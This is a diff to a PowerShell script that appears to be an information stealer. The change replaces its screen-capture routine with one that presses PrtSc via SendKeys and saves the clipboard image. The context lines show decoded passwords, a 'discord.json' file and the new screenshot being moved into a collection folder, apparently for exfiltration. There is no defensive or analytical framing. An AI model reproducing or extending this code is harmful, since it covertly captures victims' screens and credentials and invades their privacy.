@@ -852,20 +852,26 @@ Pass: $decodedPass
     #}
 
     $main_temp = "$env:localappdata\temp"
-	
-    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-    $screens = [Windows.Forms.Screen]::AllScreens
-    $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-    $left = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-    $width = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
-    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($bmp)
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$main_temp\screenshot.png")
-    $graphics.Dispose()
-    $bmp.Dispose()
+	    
+    function Get-ScreenCapture 
+    { 
+    begin { 
+        Add-Type -AssemblyName System.Drawing, System.Windows.Forms 
+        Add-Type -AssemblyName System.Drawing 
+        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |  
+            Where-Object { $_.FormatDescription -eq "JPEG" } 
+    } 
+    process { 
+    Start-Sleep -Milliseconds 44 
+    [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    
+    Start-Sleep -Milliseconds 550 
+    $bitmap = [Windows.Forms.Clipboard]::GetImage()     
+    $ep = New-Object Drawing.Imaging.EncoderParameters   
+    $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)    
+    $bitmap.Save("$main_temp\screenshot.png", $jpegCodec, $ep) 
+    } 
+    }							 			
+    Get-ScreenCapture 
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
